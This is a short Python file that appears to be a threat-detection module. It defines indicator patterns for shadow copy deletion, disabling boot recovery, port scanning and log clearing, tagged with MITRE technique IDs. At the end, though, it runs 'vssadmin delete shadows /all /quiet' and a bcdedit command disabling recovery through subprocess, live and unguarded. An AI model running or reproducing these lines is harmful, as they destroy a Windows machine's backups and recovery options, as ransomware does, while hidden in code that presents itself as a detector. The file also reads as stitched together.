from enum import Enum
class SeverityLevel(Enum):
    HIGH = 1
INDICATORS = [
    {"pattern": "recovery_sabotage", "indicators": ["vssadmin delete shadows", "bcdedit /set {default} recoveryenabled No"], "severity": SeverityLevel.HIGH, "mitre_technique": "T1490"},
    {"pattern": "network_probe", "indicators": ["port scan"], "severity": SeverityLevel.HIGH, "mitre_technique": "T1046"},
    {"pattern": "log_clear", "indicators": ["event log clear"], "severity": SeverityLevel.HIGH, "mitre_technique": "T1070"},
]

import subprocess
subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True)
